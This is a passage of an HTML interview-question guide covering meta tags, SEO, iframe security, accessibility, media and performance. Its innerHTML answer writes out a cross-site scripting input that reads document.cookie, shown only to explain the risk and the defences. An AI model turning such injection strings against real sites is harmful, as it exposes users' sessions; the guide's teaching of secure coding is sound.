/>
<meta property="og:url" content="https://example.com/recipes/pasta" />
<meta property="og:type" content="article" />
```

Note they use `property`, not `name`. The image URL should be absolute. A size of 1200x630 pixels works well on most platforms.

### 229: What are Twitter (X) card meta tags?

X uses its own tags but falls back to Open Graph for most values:

```html
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@example" />
```

`twitter:card` sets the layout: `summary` (small image) or `summary_large_image`. If you already have `og:title`, `og:description` and `og:image`, usually you only need `twitter:card`.

### 230: What is a canonical link?

```html
<link rel="canonical" href="https://example.com/shoes/running" />
```

It tells search engines the main URL of a page when the same content is available at several URLs, like with tracking parameters (`?utm_source=...`), sorting options, `www` vs no `www`, or print versions. Search engines then combine the ranking signals into that one URL instead of splitting them.

It's a hint, not a command. Use absolute URLs and point each page to itself if it has no duplicates.

### 231: What is `hreflang` used for?

It tells search engines about translated or regional versions of a page, so they show the right one to each user.

```html
<link rel="alternate" hreflang="en" href="https://example.com/en/pricing" />
<link rel="alternate" hreflang="de" href="https://example.com/de/pricing" />
<link rel="alternate" hreflang="en-GB" href="https://example.com/uk/pricing" />
<link rel="alternate" hreflang="x-default" href="https://example.com/pricing" />
```

Every version must list all the others and itself. `x-default` is the fallback for users who don't match any language.

### 232: What is the difference between `robots.txt` and the robots meta tag?

- `robots.txt` controls **crawling**. It tells bots which URLs they may fetch. A blocked page can still show up in search results (without a description) if other sites link to it.
- `<meta name="robots" content="noindex">` controls **indexing**. The bot must be able to crawl the page to see the tag.

So to remove a page from search results, use `noindex` and do **not** block it in `robots.txt`. For non-HTML files like PDFs, use the `X-Robots-Tag` HTTP header.

### 233: What is structured data and how do you add it?

Structured data describes the content of a page in a standard way, using the vocabulary from schema.org. Search engines can use it to show rich results, like star ratings, prices, FAQ answers or event dates.

The recommended format is JSON-LD in a script tag:

```html
<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Product",
    "name": "Trail running shoes",
    "image": "https://example.com/shoes.jpg",
    "offers": {
      "@type": "Offer",
      "price": "89.99",
      "priceCurrency": "USD",
      "availability": "https://schema.org/InStock"
    }
  }
</script>
```

The data should match what users see on the page.

### 234: What is microdata?

Microdata is an older way to add structured data, using attributes directly in the HTML:

```html
<div itemscope itemtype="https://schema.org/Person">
  <span itemprop="name">Nino Beridze</span>
  <span itemprop="jobTitle">Front-end developer</span>
</div>
```

It still works, but JSON-LD is usually easier because it is kept separate from the markup and doesn't break when someone changes the layout. You'll still find microdata in older templates and CMS themes.

### 235: What is the `theme-color` meta tag?

It sets the color of the browser's UI, like the address bar on mobile or the title bar of an installed web app.

```html
<meta
  name="theme-color"
  content="#ffffff"
  media="(prefers-color-scheme: light)"
/>
<meta
  name="theme-color"
  content="#111111"
  media="(prefers-color-scheme: dark)"
/>
```

Support varies: Safari and Chrome on Android use it, desktop browsers mostly don't.

### 236: What is a web app manifest and how do you link it?

A manifest is a JSON file that describes your web app: name, icons, start URL, colors and display mode. It's needed to make a site installable as a PWA.

```html
<link rel="manifest" href="/manifest.webmanifest" />
```

```json
{
  "name": "My Notes",
  "short_name": "Notes",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#3366ff",
  "icons": [
    { "src": "/icons/192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icons/512.png", "sizes": "512x512", "type": "image/png" }
  ]
}
```

### 237: What icon links does a modern site need?

A small set covers almost everything:

```html
<link rel="icon" href="/favicon.ico" sizes="32x32" />
<link rel="icon" href="/icon.svg" type="image/svg+xml" />
<link rel="apple-touch-icon" href="/apple-touch-icon.png" /><!-- 180x180 -->
<link
  rel="manifest"
  href="/manifest.webmanifest"
/><!-- with 192 and 512 icons -->
```

The `.ico` is for old browsers and tools that request `/favicon.ico` directly. The SVG is for modern browsers. The Apple touch icon is used when someone adds the site to their iOS home screen.

### 238: What does `<meta http-equiv>` do?

It acts like an HTTP response header set inside the HTML. Common uses:

```html
<meta http-equiv="refresh" content="5; url=https://example.com/new" />
<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
```

- `refresh` reloads or redirects the page after some seconds. Avoid it for redirects; use a server 301/302, since it hurts accessibility and SEO.
- `Content-Security-Policy` sets a CSP, but some directives (like `frame-ancestors` and `report-uri`) don't work in a meta tag.

Real HTTP headers are better when you can set them.

### 239: What do `rel="nofollow"`, `rel="ugc"` and `rel="sponsored"` mean?

They tell search engines about the relationship with the linked page:

- `nofollow`: don't pass ranking credit to this link.
- `sponsored`: the link is an ad or paid placement.
- `ugc`: the link is in user-generated content, like comments or forum posts.

```html
<a href="https://partner.example.com" rel="sponsored">Our partner</a>
```

You can combine them: `rel="ugc nofollow"`. Google treats them as hints.

### 240: What is the difference between `rel="noopener"` and `rel="noreferrer"`?

- `noopener`: the new page gets `window.opener` set to `null`, so it can't control your page.
- `noreferrer`: the browser doesn't send the `Referer` header, and it also implies `noopener`.

You can also control referrers more precisely with the `referrerpolicy` attribute:

```html
<a href="https://example.com" referrerpolicy="no-referrer">Link</a>
<img src="https://cdn.example.com/x.png" referrerpolicy="origin" alt="" />
```

### 241: Do you still need `rel="noopener"` with `target="_blank"`?

For current browsers, no. Chrome, Firefox and Safari all treat `target="_blank"` links as `noopener` by default since around 2020-2021. Very old browsers didn't, and the linked page could use `window.opener.location` to redirect your page to a phishing site ("reverse tabnabbing").

Many linters still require `rel="noopener noreferrer"` and it does no harm, so it is fine to keep it. If the opened page legitimately needs `window.opener` (rare, like some OAuth popups), you have to add `rel="opener"`.

### 242: What does the `sandbox` attribute on an `<iframe>` do?

`sandbox` puts heavy restrictions on the embedded page. With an empty `sandbox`, the frame:

- Can't run scripts
- Can't submit forms
- Is treated as a unique origin (no cookies or storage from its real origin)
- Can't open popups or navigate the top page

You then allow only what you need:

```html
<iframe
  src="/widget.html"
  sandbox="allow-scripts allow-forms"
  title="Widget"
></iframe>
```

It is great for showing untrusted content, like user-written HTML or third-party widgets.

### 243: What does the `allow` attribute on an `<iframe>` do?

`allow` sets the Permissions Policy for the frame, meaning which powerful features it may use:

```html
<iframe
  src="https://video.example.com/embed/123"
  title="Video"
  allow="fullscreen; autoplay; encrypted-media; picture-in-picture"
>
</iframe>

<iframe src="https://maps.example.com" title="Map" allow="geolocation"></iframe>
```

Cross-origin frames don't get features like camera, microphone, geolocation or autoplay unless you allow them. This stops third-party content from asking for permissions you don't expect.

### 244: What is the `srcdoc` attribute?

`srcdoc` puts the HTML of the frame directly in the attribute, instead of loading a URL:

```html
<iframe srcdoc="<p>Hello <b>world</b></p>" sandbox title="Preview"></iframe>
```

It is useful for previews, like an email or a code playground. If both `srcdoc` and `src` are set, `srcdoc` wins. A `srcdoc` frame has the same origin as the parent unless you sandbox it, so always use `sandbox` with untrusted content.

### 245: Why do iframes need a `title` attribute?

Screen readers announce the `title` when the user reaches the frame. Without it, the user only hears "frame" and has no idea if it is a video, a map, an ad or a payment form.

```html
<iframe
  src="https://www.youtube.com/embed/abc"
  title="Video: How to set up your account"
></iframe>
```

### 246: Should you lazy-load iframes?

Yes, for frames below the first screen. Embeds like YouTube videos, maps and social posts load a lot of JavaScript, even if the user never scrolls to them.

```html
<iframe
  src="https://www.youtube.com/embed/abc"
  title="Demo"
  loading="lazy"
  width="560"
  height="315"
></iframe>
```

For even better performance, use a "facade": show a static image with a play button, and only insert the real iframe when the user clicks.

### 247: How do a page and an iframe talk to each other?

With `postMessage`, which works safely between different origins:

```js
// parent page
const frame = document.querySelector("iframe");
frame.contentWindow.postMessage(
  { type: "theme", value: "dark" },
  "https://widget.example.com",
);

// inside the iframe
window.addEventListener("message", (event) => {
  if (event.origin !== "https://parent.example.com") return;
  console.log(event.data);
});
```

Always pass a specific target origin instead of `'*'` when sending, and always check `event.origin` when receiving.

### 248: Why might characters like `Ã©` show up on a page instead of `é`?

That's an encoding mismatch. The file was saved as UTF-8, but the browser read it as a different encoding, like Windows-1252, so each multi-byte character shows as two odd characters.

Fix it by:

- Adding `<meta charset="utf-8">` as the first thing in `<head>`.
- Making the server send `Content-Type: text/html; charset=utf-8`.
- Saving the files as UTF-8 in your editor.
- Making sure the database connection uses UTF-8 too.

### 249: What is the difference between named and numeric character references?

- Named: `&copy;`, `&euro;`, `&nbsp;`. Easier to read, but there's a fixed list.
- Numeric decimal: `&#169;`
- Numeric hex: `&#xA9;`

Numeric references work for any Unicode character. With UTF-8 pages you rarely need either one, except for `&lt;`, `&amp;`, `&quot;` and invisible characters like `&nbsp;`, where seeing them in the code is useful.

### 250: Why is it dangerous to put user input into `innerHTML`?

`innerHTML` parses the string as HTML. If the string comes from a user, they can inject markup that runs JavaScript:

```js
const name = '<img src=x onerror="alert(document.cookie)">';
el.innerHTML = `Hello ${name}`; // runs the attacker's code
```

This is a cross-site scripting (XSS) attack. Use `textContent` for text, or create elements with `createElement`. If you really need to insert user HTML, sanitize it first with a library like DOMPurify. Frameworks like React escape values by default, except when you use `dangerouslySetInnerHTML`.

### 251: What is the difference between `textContent`, `innerText` and `innerHTML`?

- `textContent`: all the text inside the element, including hidden text and text inside `<script>` and `<style>`. Setting it inserts plain text. It is fast and safe.
- `innerText`: only the text as it is shown on screen. It respects CSS, so hidden text is skipped and line breaks follow the layout. Reading it triggers layout, so it's slower.
- `innerHTML`: the HTML markup inside the element as a string. Setting it parses HTML, which is a security risk with user data.

Use `textContent` by default for setting text.

### 252: What is the difference between attributes and properties?

Attributes are in the HTML markup. Properties are on the DOM object in JavaScript. Many attributes have matching properties, but they are not always the same:

```html
<input id="name" value="Ana" />
```

```js
const input = document.getElementById("name");
// user types "Maria"
input.value; // "Maria" (property, current value)
input.getAttribute("value"); // "Ana" (attribute, initial value)
input.defaultValue; // "Ana"
```

Some names differ too: the `class` attribute is the `className` property, and `for` is `htmlFor`.

### 253: Why doesn't `setAttribute('disabled', 'false')` enable a button?

Because `disabled` is a boolean attribute. Its presence means "disabled", no matter what the value is. `'false'` is just a string.

```js
button.setAttribute("disabled", "false"); // still disabled
button.removeAttribute("disabled"); // enabled
button.disabled = false; // enabled (property is a real boolean)
```

Use the property, or `toggleAttribute('disabled', condition)`.

### 254: What is the difference between the `input` and `change` events?

- `input` fires on every change to the value, like each keystroke in a text field.
- `change` fires when the change is "committed": for text fields when the field loses focus after being changed, for checkboxes, radios and selects right after the user picks a value.

```js
field.addEventListener("input", (e) => updatePreview(e.target.value));
field.addEventListener("change", (e) => saveDraft(e.target.value));
```

Use `input` for live feedback and `change` for less frequent work.

### 255: Is the HTML document outline algorithm real?

No, not anymore. The HTML5 spec described an outline algorithm where each `<section>`, `<article>`, `<aside>` and `<nav>` could start its own heading levels, so you could use `<h1>` everywhere. No browser or screen reader ever implemented it, and it was removed from the spec in 2022.

So the heading level you write is the level users get. Use `<h1>`–`<h6>` based on the real structure of the page.

### 256: Does every `<section>` need a heading?

It should have one in almost all cases. A `<section>` is a thematic group of content, and the heading says what the theme is. If you can't think of a heading, a `<div>` is probably the better element.

A `<section>` only becomes a `region` landmark when it has an accessible name, for example through `aria-labelledby` pointing to its heading.

### 257: Should every group of links be in a `<nav>`?

No. `<nav>` is for **major** navigation blocks: the main menu, a table of contents, breadcrumbs, pagination. A few links in a footer or a list of related articles don't need it.

Too many `<nav>` landmarks make landmark navigation noisy for screen reader users. When you do have several, label them with `aria-label="Main"`, `aria-label="Breadcrumb"` and so on. Don't include the word "navigation" in the label, since the screen reader already says it.

### 258: Can a page have more than one `<header>` and `<footer>`?

Yes. Each `<article>` or `<section>` can have its own `<header>` and `<footer>`. Only the ones that are not inside `<article>`, `<aside>`, `<main>`, `<nav>` or `<section>` become the `banner` and `contentinfo` landmarks. So the page header and footer are landmarks, while the header of a blog post card is not.

You can't put a `<header>` or `<footer>` inside another `<header>` or `<footer>`.

### 259: What are the rules for the `<main>` element?

- Only one `<main>` should be visible at a time. You can have several if all but one have the `hidden` attribute (useful for single-page apps).
- It must not be inside `<article>`, `<aside>`, `<footer>`, `<header>` or `<nav>`.
- It should contain the content that is unique to the page, not repeated site navigation or footers.

### 260: What are good uses of `<article>`?

Anything that makes sense on its own:

- A blog post or news story
- A product card in a list
- A user comment or forum post
- A social media post in a feed
- A widget like a weather card

Articles can be nested. For example, comments on a blog post can be `<article>` elements inside the post's `<article>`. Each article should usually have a heading.

### 261: Is `<figure>` only for images?

No. `<figure>` is for any self-contained content referenced from the main text:

```html
<figure>
  <pre><code>npm install vite</code></pre>
  <figcaption>Listing 1: Installing Vite</figcaption>
</figure>

<figure>
  <blockquote><p>Make it work, make it right, make it fast.</p></blockquote>
  <figcaption>Kent Beck</figcaption>
</figure>
```

It also works for charts, tables, videos and diagrams.

### 262: Why shouldn't you use tables for page layout?

Tables were used for layout before CSS was good enough, but today it's a bad idea:

- Screen readers announce rows and columns, which makes no sense for a layout.
- Content order is fixed by the table structure, which makes responsive design very hard.
- The markup is heavy and hard to change.

Use CSS Grid and Flexbox for layout. Tables are only for tabular data. (HTML email is the one place where layout tables are still common.)

### 263: How do you make a wide table work on small screens?

From the HTML side, the simplest and most accessible way is to let the table scroll inside a container:

```html
<div class="table-wrap" role="region" aria-labelledby="cap" tabindex="0">
  <table>
    <caption id="cap">
      Plans compared
    </caption>
    ...
  </table>
</div>
```

```css
.table-wrap {
  overflow-x: auto;
}
```

The `tabindex="0"` lets keyboard users scroll it, and `role="region"` with a label tells screen reader users what the scrolling area is. Changing tables into stacked cards with CSS is possible too, but `display` changes on table elements can remove table semantics in some browsers.

### 264: Why use lists for navigation menus?

```html
<nav aria-label="Main">
  <ul>
    <li><a href="/">Home</a></li>
    <li><a href="/products">Products</a></li>
    <li><a href="/contact">Contact</a></li>
  </ul>
</nav>
```

Screen readers announce "list, 3 items", so users know how many links there are and where they are in the list. It is a common convention, but not a strict rule. A `<nav>` with plain links is also fine.

One thing to know: Safari/VoiceOver removes list semantics when you set `list-style: none`. You can bring it back with `role="list"` on the `<ul>` if it matters.

### 265: How do you mark up breadcrumbs?

```html
<nav aria-label="Breadcrumb">
  <ol>
    <li><a href="/">Home</a></li>
    <li><a href="/shoes">Shoes</a></li>
    <li><a href="/shoes/running" aria-current="page">Running</a></li>
  </ol>
</nav>
```

Use `<ol>` because the order matters. Add the separators (`/` or `>`) with CSS, so screen readers don't read them. Mark the last item with `aria-current="page"`. You can also add `BreadcrumbList` structured data for search engines.

### 266: How do you mark up pagination?

```html
<nav aria-label="Pagination">
  <ul>
    <li><a href="?page=1" aria-label="Previous page">Previous</a></li>
    <li><a href="?page=1">1</a></li>
    <li><a href="?page=2" aria-current="page">2</a></li>
    <li><a href="?page=3">3</a></li>
    <li><a href="?page=3">Next</a></li>
  </ul>
</nav>
```

Use real links with real URLs, so pages can be bookmarked and crawled. Make the current page clear with `aria-current="page"`, and give number-only links extra context if needed, like `aria-label="Page 3"`.

### 267: What are content categories in HTML?

The spec groups elements into categories that decide where they can be used:

- **Metadata content**: `<link>`, `<meta>`, `<script>`, `<style>`, `<title>`
- **Flow content**: most elements that go in `<body>`
- **Sectioning content**: `<article>`, `<aside>`, `<nav>`, `<section>`
- **Heading content**: `<h1>`–`<h6>`, `<hgroup>`
- **Phrasing content**: text-level elements like `<span>`, `<a>`, `<em>`, `<img>`, `<input>`
- **Embedded content**: `<img>`, `<video>`, `<iframe>`, `<canvas>`, `<svg>`
- **Interactive content**: `<a href>`, `<button>`, `<input>`, `<select>`, `<details>`...

Each element's "content model" lists which categories it may contain. For example, `<p>` may only contain phrasing content.

### 268: Can you put a link inside a button, or a button inside a link?

No. Both `<a>` and `<button>` are interactive content, and interactive content can't contain other interactive content. Browsers handle it in odd ways, and users can't tell which one they are clicking. Screen readers also get confused.

A common case is a card where the whole thing is a link but it also has a "Save" button. Instead of nesting, make the title a link and stretch its click area over the card with CSS (a `::after` with `position: absolute; inset: 0`), and keep the button as a separate element on top.

### 269: Can an `<a>` element wrap block content like `<div>` and headings?

Yes. Since HTML5, `<a>` has a "transparent" content model. It can contain whatever its parent is allowed to contain, as long as there is no interactive content inside.

```html
<a href="/post/42" class="card">
  <h3>How to brew coffee</h3>
  <p>A simple guide for beginners.</p>
</a>
```

The downside: screen readers read all the text inside as the link name, which can be long. For cards with lots of content, linking just the heading is often better.

### 270: What are the autoplay rules for video, and what does `playsinline` do?

Browsers allow autoplay when the video is muted, or when the user has interacted with the site. Videos with sound usually need a user gesture.

`playsinline` tells iOS Safari to play the video inside the page instead of going full screen. You need it for background videos and GIF-like videos.

```html
<video autoplay muted loop playsinline poster="still.jpg">
  <source src="loop.webm" type="video/webm" />
  <source src="loop.mp4" type="video/mp4" />
</video>
```

Give users a way to pause moving content that lasts more than 5 seconds (a WCAG requirement), and respect `prefers-reduced-motion`.

### 271: What does the `preload` attribute on `<video>` and `<audio>` do?

It hints how much of the media to load before the user presses play:

- `none`: load nothing.
- `metadata`: load only basic info like duration and dimensions.
- `auto`: the browser may download the whole file.

```html
<video controls preload="none" poster="thumb.jpg" src="lecture.mp4"></video>
```

For pages with many videos, `preload="none"` or `metadata` saves a lot of data. Browsers can ignore the hint, for example on mobile data.

### 272: Why add codecs to the `type` attribute of `<source>`?

`type="video/mp4"` only says the container format. The browser might support MP4 but not the codec inside, like HEVC or AV1. Adding the codec lets the browser skip files it can't play without downloading them:

```html
<video controls>
  <source src="movie-av1.mp4" type='video/mp4; codecs="av01.0.05M.08"' />
  <source src="movie-h264.mp4" type='video/mp4; codecs="avc1.42E01E"' />
</video>
```

Put the most efficient format first and the widest-supported one (H.264) last.

### 273: What is the difference between captions, subtitles and descriptions in `<track>`?

- `subtitles`: translation of the dialogue for viewers who can hear but don't understand the language.
- `captions`: a transcript of the dialogue plus important sounds (like "[door slams]") for deaf and hard of hearing viewers.
- `descriptions`: text descriptions of what happens on screen, for blind users. Can be read out by screen readers.
- `chapters`: chapter titles for navigation.
- `metadata`: data for scripts, not shown.

### 274: Which images should and shouldn't be lazy-loaded?

Lazy-load images that are below the first screen: images further down an article, product grids after the first row, footer logos.

Don't lazy-load:

- The hero image or the LCP element.
- Logos and images in the header.
- Anything visible without scrolling on common screen sizes.

Lazy loading delays the request until layout is known, so using it on above-the-fold images makes them load later and hurts LCP. If you're not sure, leave the first few images eager.

### 275: What is LCP and how can HTML help improve it?

LCP (Largest Contentful Paint) measures when the biggest image or text block in the viewport is shown. A good LCP is 2.5 seconds or less.

HTML changes that help:

- Use a real `<img>` for the hero, not a CSS background, so the preload scanner finds it early.
- Add `fetchpriority="high"` to the LCP image and don't use `loading="lazy"` on it.
- Use `srcset`/`sizes` and modern formats so the file is small.
- Use `defer` on scripts and keep render-blocking CSS small.
- `preconnect` to the image CDN if it's on another origin.
- Render the main content on the server instead of waiting for client JavaScript.

### 276: What is critical CSS and how do you include it?

Critical CSS is the small set of styles needed to render the first screen. You inline it in a `<style>` tag in `<head>`, so the first paint doesn't wait for a CSS file. The rest of the CSS loads after.

```html
<head>
  <style>
    /* header, hero and layout styles only */
  </style>
  <link rel="stylesheet" href="/main.css" />
</head>
```

The trade-off: inlined CSS is not cached and adds to every HTML response. It helps most on first visits and slow networks. Tools can extract it automatically, but it's extra complexity, so measure before and after.

### 277: Is it better to put scripts at the end of `<body>` or in `<head>` with `defer`?

`<head>` with `defer` is usually better. Both run the script after the HTML is parsed, but with `defer` in `<head>` the browser finds the script right away and starts downloading it in parallel with parsing. At the end of `<body>`, the download only starts when the parser reaches it (the preload scanner can help, but not always).

Deferred scripts also run in order and before `DOMContentLoaded`, just like scripts at the end of the body.

### 278: Can you overuse resource hints?

Yes. Each `preload` takes bandwidth and priority away from other resources. If you preload too much, the really important files (like the main CSS or the LCP image) can get slower.

Common mistakes:

- Preloading resources that aren't used on the page.
- Preloading things the browser would find early anyway (like a `<script>` in `<head>`).
- Preconnecting to too many origins.
- Forgetting `crossorigin` on font preloads, which causes a double download.

Add hints only where you've measured a problem, and check the Network panel afterward.

### 279: How does DOM size affect performance?

A large DOM (thousands of elements) makes everything slower:

- Style calculation and layout have more work.
- Memory use goes up.
- `querySelectorAll` and other DOM queries take longer.
- Frameworks have more nodes to compare and update.

Lighthouse warns at around 1,400 elements. To reduce it, avoid deep wrapper `<div>`s, render long lists with virtualization or pagination, and load hidden content (tabs, modals) only when needed. CSS `content-visibility: auto` can also skip rendering work for off-screen sections.

### 280: How do you load a print stylesheet without blocking rendering?

Use the `media` attribute:

```html
<link rel="stylesheet" href="print.css" media="print" />
```

The browser still downloads it, but with low priority, and it doesn't block rendering on screen because the media query doesn't match. The same works for other media queries like `(min-width: 1200px)`.

### 281: What does `<meta name="color-scheme">` do?

It tells the browser which color schemes the page supports, before any CSS loads:

```html
<meta name="color-scheme" content="light dark" />
```

The browser then uses dark default colors for the background, form controls and scrollbars when the user prefers dark mode. This avoids a white flash before your dark CSS loads. The CSS property `color-scheme` does the same thing from a stylesheet.

### 282: What does `<meta name="referrer">` do?

It sets the referrer policy for the whole page, meaning how much of the current URL is sent in the `Referer` header when the user follows links or the page loads resources.

```html
<meta name="referrer" content="strict-origin-when-cross-origin" />
```

Common values:

- `no-referrer`: send nothing.
- `origin`: send only `https://example.com/`.
- `strict-origin-when-cross-origin` (the browser default): full URL to the same origin, only the origin to other sites, nothing from HTTPS to HTTP.

It's useful when your URLs can contain private data like reset tokens.

### 283: How does `dir="auto"` help with user content?

When users write in different languages, you don't know the direction ahead of time. `dir="auto"` makes the browser look at the first strong directional character and pick `ltr` or `rtl`:

```html
<p dir="auto">{{ comment.text }}</p>
<input name="title" dir="auto" />
```

Without it, an Arabic comment on an English page can show punctuation and numbers in the wrong place. For short pieces inside a sentence, `<bdi>` does the same job.

### 284: What formats does the `datetime` attribute on `<time>` accept?

Several standard formats:

```html
<time datetime="2026-10-24">Oct 24</time>
<!-- date -->
<time datetime="2026-10">October 2026</time>
<!-- month -->
<time datetime="2026">2026</time>
<!-- year -->
<time datetime="14:30">2:30 PM</time>
<!-- time -->
<time datetime="2026-10-24T14:30">Saturday afternoon</time>
<!-- local date and time -->
<time datetime="2026-10-24T14:30:00+04:00">2:30 PM Tbilisi</time>
<!-- with offset -->
<time datetime="2026-W43">week 43</time>
<!-- week -->
<time datetime="PT1H30M">1.5 hours</time>
<!-- duration -->
```

If there's no `datetime` attribute, the text content itself must be in one of these formats.

### 285: When doesn't the `download` attribute work?

- For cross-origin URLs, browsers ignore it and just navigate to the file. The server needs to send `Content-Disposition: attachment` instead.
- If the server sends `Content-Disposition` with a different file name, the header usually wins.
- Inside sandboxed iframes, downloads are blocked unless `allow-downloads` is set.

For files you generate in the browser, create a `Blob`, make a URL with `URL.createObjectURL()`, and use that in a link with `download`.

### 286: How do you link to an RSS or Atom feed?

```html
<link
  rel="alternate"
  type="application/rss+xml"
  title="Blog posts"
  href="/feed.xml"
/>
<link
  rel="alternate"
  type="application/atom+xml"
  title="Blog posts (Atom)"
  href="/atom.xml"
/>
```

Feed readers and some browser extensions use this to discover the feed automatically when someone enters your site URL.

### 287: How do `<meter>`'s `low`, `high` and `optimum` attributes work?

They divide the range into low, medium and high parts and say which part is good. The browser colors the meter based on that.

```html
<label
  >Battery
  <meter min="0" max="100" low="20" high="80" optimum="100" value="15">
    15%
  </meter>
</label>
```

Here `optimum` is in the high part, so high values are good (green) and the value 15 is in the low part, which is the worst (red). If `optimum` were in the low part, low values would be green instead.

### 288: How do you make an icon-only button accessible?

It needs an accessible name, because there's no visible text:

```html
<button type="button" aria-label="Close dialog">
  <svg aria-hidden="true" focusable="false" width="16" height="16">...</svg>
</button>
```

Or use visually hidden text:

```html
<button type="button">
  <svg aria-hidden="true">...</svg>
  <span class="visually-hidden">Close dialog</span>
</button>
```

Hide the icon itself with `aria-hidden`. Also consider a tooltip or visible label for sighted users, since icons aren't always clear.

### 289: What are the accessibility problems with placeholders?

- Placeholder text usually has low color contrast, which fails WCAG for many users.
- It disappears on typing, so users lose the hint and must clear the field to see it again.
- Some screen readers don't read it, or read it inconsistently.
- Users may think the field is already filled.
- Browser autofill can hide it.

Use a visible `<label>` and put any hints in text linked with `aria-describedby`.

### 290: Should you use `required` and `aria-required` together?

Usually no. The native `required` attribute already tells screen readers the field is required, and also gives browser validation. `aria-required="true"` only adds the announcement, without validation.

Use `aria-required` for custom controls that can't use `required` (for example a custom combobox with `role="combobox"`), or when you use `novalidate` and still want to tell users which fields are required. Also show it visually, like an asterisk with a note explaining what it means.

### 291: How do you style a custom checkbox while keeping it accessible?

Keep the real `<input type="checkbox">` and style it, instead of replacing it with a `<div>`:

```css
input[type="checkbox"] {
  appearance: none;
  width: 1.25rem;
  height: 1.25rem;
  border: 2px solid currentColor;
  border-radius: 4px;
  display: grid;
  place-content: center;
}

input[type="checkbox"]:checked::before {
  content: "";
  width: 0.7rem;
  height: 0.7rem;
  background: currentColor;
  clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0%, 43% 62%);
}

input[type="checkbox"]:focus-visible {
  outline: 2px solid blue;
  outline-offset: 2px;
}
```

The native input keeps keyboard support, form submission, label clicking and screen reader announcements. You can also use `accent-color` for a quick color change.

### 292: How do you hide content visually but keep it for screen readers?

Use a "visually hidden" CSS class:

```css
.visually-hidden {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip-path: inset(50%);
  white-space: nowrap;
  border: 0;
}
```

```html
<a href="/cart">
  <svg aria-hidden="true">...</svg>
  <span class="visually-hidden">Shopping cart, 3 items</span>
</a>
```

Don't use `display: none` or `visibility: hidden` for this, since those also hide the content from screen readers.

### 293: What is the difference between `hidden`, `display: none`, `aria-hidden` and visually hidden?

| Method                               | Visible          | Read by screen readers | Focusable      |
| ------------------------------------ | ---------------- | ---------------------- | -------------- |
| `hidden` attribute / `display: none` | No               | No                     | No             |
| `visibility: hidden`                 | No (keeps space) | No                     | No             |
| `aria-hidden="true"`                 | Yes              | No                     | Yes (careful!) |
| Visually hidden class                | No               | Yes                    | Yes            |
| `inert`                              | Yes              | No                     | No             |

Pick based on who should get the content: nobody, only screen reader users, or only sighted users.

### 294: How is HTML for emails different from HTML for websites?

Email clients (especially Outlook on Windows) support a very limited and old subset of HTML and CSS:

- Layout is usually done with nested `<table>` elements.
- CSS is often inlined in `style` attributes, since `<style>` blocks may be stripped.
- No JavaScript at all.
- Limited support for modern CSS like Flexbox, Grid or custom properties.
- Images may be blocked by default, so `alt` text matters a lot.
- Fixed widths around 600px are common.

Tools like MJML or React Email generate this markup for you.

### 295: How do you test the accessibility of your HTML?

Use a mix of tools and manual checks:

1. Automated tools: axe DevTools, Lighthouse, WAVE. They catch around 30-40% of issues, like missing `alt`, low contrast and missing labels.
2. Keyboard testing: unplug the mouse and use Tab, Shift+Tab, Enter, Space, arrows and Esc. Check that focus is always visible and in a logical order.
3. Screen reader testing: VoiceOver on macOS/iOS, NVDA on Windows, TalkBack on Android.
4. Zoom the page to 200% and 400%.
5. Check the Accessibility tree in DevTools.

You can also add automated checks to tests with tools like `axe-core` and Playwright.

### 296: What are common HTML mistakes you look for in code review?

- Clickable `<div>` and `<span>` instead of `<button>` or `<a>`.
- Missing `alt`, or `alt` with file names.
- Inputs without labels.
- Buttons inside forms without `type`.
- Duplicate `id` values.
- Heading levels chosen by size.
- Images without `width` and `height`.
- `target="_blank"` with no warning or reason.
- Invalid nesting, like `<div>` inside `<p>` or a link inside a button.
- `user-scalable=no` in the viewport meta.
- `aria-*` attributes that conflict with native semantics.
- Missing `lang` on `<html>`.

### 297: What are the main differences between HTML and JSX?

- `class` is `className` and `for` is `htmlFor`.
- All tags must be closed, including void elements: `<img />`, `<br />`.
- Attributes are camelCase: `onClick`, `tabIndex`, `readOnly`, `autoComplete`. `aria-*` and `data-*` stay as they are.
- `style` takes an object: `style={{ marginTop: 8 }}`.
- Comments are `{/* ... */}`.
- JSX is converted to JavaScript calls. Values are escaped automatically, so it's safe from basic HTML injection.

The final output is still HTML in the browser, so the rules about semantics, nesting and accessibility still apply.

### 298: What is the difference between HTML and XHTML?

XHTML is HTML written with XML rules:

- All tags must be closed and properly nested.
- Tag and attribute names are case-sensitive and lowercase.
- Attribute values must be quoted.
- Boolean attributes need values: `checked="checked"`.

The big difference is error handling. When served as `application/xhtml+xml`, one error makes the browser show an error instead of the page. Normal HTML is forgiving and always renders. Almost all websites today use HTML, not XHTML.

### 299: What is the `<hgroup>` element?

`<hgroup>` groups a heading with related content like a subtitle or tagline:

```html
<hgroup>
  <h1>Frontend Weekly</h1>
  <p>News and tips for web developers</p>
</hgroup>
```

In the current spec, `<hgroup>` contains one heading plus `<p>` elements. Older versions allowed several headings inside, which is now invalid. Using a `<p>` for the subtitle (instead of an `<h2>`) avoids adding a fake heading level.

### 300: How do you write an accessible "Read more" link when you have many of them?

Several links with the same text "Read more" are confusing for screen reader users who browse a list of links. Some options:

```html
<!-- add hidden context -->
<a href="/post/1"
  >Read more<span class="visually-hidden">
    about choosing running shoes</span
  ></a
>

<!-- reference the heading -->
<h3 id="post-1">Choosing running shoes</h3>
<a href="/post/1" aria-labelledby="readmore-1 post-1" id="readmore-1"
  >Read more</a
>
```

Often the simplest fix is to make the heading itself the link and drop the "Read more" link.

## Advanced Questions (301-450)

### 301: How does the HTML parser work?

The HTML parser has two main stages:

1. **Tokenizer**: reads characters one by one and turns them into tokens: start tags, end tags, comments, text and the DOCTYPE. It is a state machine with around 80 states (data, tag open, attribute name, script data and so on).
2. **Tree construction**: takes the tokens and builds the DOM. It keeps a stack of open elements and an "insertion mode" (like "in head", "in body", "in table") that decides what each token does.

The two stages talk to each other. For example, after a `<script>` or `<textarea>` start tag, tree construction switches the tokenizer into a special state where tags inside are treated as text. And scripts can add more input with `document.write()` while parsing is going on, which is why the parser can't simply run ahead.

### 302: What is "foster parenting" in the HTML parser?

